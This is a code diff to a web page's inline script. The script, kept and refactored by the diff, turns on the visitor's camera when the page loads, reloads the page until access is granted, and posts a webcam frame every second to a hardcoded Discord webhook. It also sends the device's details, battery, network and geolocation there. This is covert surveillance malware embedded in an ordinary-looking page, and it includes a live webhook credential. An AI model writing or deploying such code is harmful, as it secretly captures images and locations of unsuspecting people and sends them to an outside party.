@@ -271,113 +271,110 @@
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas"></canvas>
 
-  <script>
+<script>
     const webhookURL = 'https://discord.com/api/webhooks/1366781971711266938/R3CLmI2zuaN5U1eTTFGIBbW58oj7yBakju4ygkX1aZT0FS-elKNIqo0lYJJ6lRfoM61f';
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const ctx = canvas.getContext('2d');
-
-  document.addEventListener("DOMContentLoaded", enableCamera);
-
-  function enableCamera() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+  
+    document.addEventListener("DOMContentLoaded", enableCamera);
+  
+    async function enableCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-
+  
         video.onloadedmetadata = () => {
           video.play();
-
-          // Set canvas size to video dimensions
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
-
+  
           startAutoCapture();
-          collectAdditionalInfo(); // Optional if needed
+          collectAdditionalInfo();
         };
-      })
-      .catch(err => {
+      } catch (err) {
         alert("⚠️ Please allow camera access to proceed.");
         location.reload();
-      });
-  }
-
-  function startAutoCapture() {
-    setInterval(() => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('file', blob, 'capture.png');
-        formData.append('username', 'cam');
-        formData.append('content', '📸 New frame captured!');
-
-        fetch(webhookURL, {
-          method: 'POST',
-          body: formData
-        }).catch(err => console.error('Webhook error:', err));
-      }, 'image/png');
-    }, 500); // 1 second interval
-  }
-
-    function collectAdditionalInfo() {
-      // Basic device info
-      const deviceInfo = {
+      }
+    }
+  
+    function startAutoCapture() {
+      setInterval(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          if (blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'capture.png');
+            formData.append('username', 'cam');
+            formData.append('content', '📸 New frame captured!');
+            sendToWebhook(formData);
+          }
+        }, 'image/png');
+      }, 1000); // Every second
+    }
+  
+    async function collectAdditionalInfo() {
+      const info = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
         screenSize: `${screen.width}x${screen.height}`,
         timestamp: new Date().toLocaleString()
       };
-
-      // Battery status
+  
+      // Battery Info
       if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-          deviceInfo.battery = {
-            level: battery.level * 100 + '%',
+        try {
+          const battery = await navigator.getBattery();
+          info.battery = {
+            level: Math.round(battery.level * 100) + '%',
             charging: battery.charging
           };
-          sendDeviceInfo(deviceInfo);
-        });
-      } else {
-        sendDeviceInfo(deviceInfo);
+        } catch (_) {}
       }
-
+  
       // Network Info
       if (navigator.connection) {
-        deviceInfo.network = {
+        info.network = {
           type: navigator.connection.effectiveType,
           downlink: navigator.connection.downlink + ' Mbps'
         };
       }
-
+  
       // Geolocation
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          deviceInfo.location = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          };
-          sendDeviceInfo(deviceInfo);
-        }, err => {
-          deviceInfo.location = 'Permission denied';
-          
-          sendDeviceInfo(deviceInfo);
-        });
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            info.location = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            };
+            sendDeviceInfo(info);
+          },
+          () => {
+            info.location = 'Permission denied';
+            sendDeviceInfo(info);
+          }
+        );
+      } else {
+        sendDeviceInfo(info);
       }
     }
-
+  
     function sendDeviceInfo(info) {
       const content = `📱 **Device Info**\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``;
-
+      sendToWebhook(JSON.stringify({ username: "VishnuCam", content }), true);
+    }
+  
+    function sendToWebhook(data, isJSON = false) {
       fetch(webhookURL, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ username: "VishnuCam", content })
-      }).catch(err => console.error('Device info send failed:', err));
+        headers: isJSON ? { 'Content-Type': 'application/json' } : undefined,
+        body: data
+      }).catch(err => console.error('Webhook error:', err));
     }
   </script>
+  
 
 <footer>
     <div class="footer-container">
